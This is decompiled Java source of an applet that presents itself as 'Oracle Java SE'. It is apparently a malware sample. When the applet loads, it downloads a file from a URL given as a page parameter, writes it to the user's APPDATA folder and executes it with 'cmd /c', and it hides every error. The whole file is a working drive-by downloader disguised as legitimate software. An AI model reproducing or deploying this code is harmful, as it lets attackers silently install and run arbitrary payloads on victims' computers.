// 
// Decompiled by Procyon v0.5.30
// 

package OracleJavaSE;

import java.io.IOException;
import java.net.URLConnection;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.URL;
import java.applet.Applet;

public class OracleJavaSE extends Applet
{
    public void init() {
        try {
            final String parameter = this.getParameter("F");
            final String getenv = System.getenv("APPDATA");
            final InputStream getInputStream = this.GetInputStream(this.OpenConnection(new URL(this.getParameter("U"))));
            final FileOutputStream getOutputStream = this.GetOutputStream(getenv + "\\" + parameter);
            final byte[] array = new byte[512];
            int read;
            while ((read = getInputStream.read(array, 0, array.length)) != -1) {
                getOutputStream.write(array, 0, read);
            }
            getInputStream.close();
            getOutputStream.close();
            this.Execute(getenv + "\\" + parameter);
        }
        catch (Exception ex) {}
    }
    
    public URLConnection OpenConnection(final URL url) {
        try {
            return url.openConnection();
        }
        catch (IOException ex) {
            return null;
        }
    }
    
    public InputStream GetInputStream(final URLConnection urlConnection) {
        try {
            return urlConnection.getInputStream();
        }
        catch (IOException ex) {
            return null;
        }
    }
    
    public FileOutputStream GetOutputStream(final String s) {
        try {
            return new FileOutputStream(s);
        }
        catch (IOException ex) {
            return null;
        }
    }
    
    public void Execute(final String s) {
        try {
            Runtime.getRuntime().exec("cmd /c \"" + s + "\"");
        }
        catch (Exception ex) {}
    }
    
    public String getAppletInfo() {
        return "Oracle Java SE";
    }
}
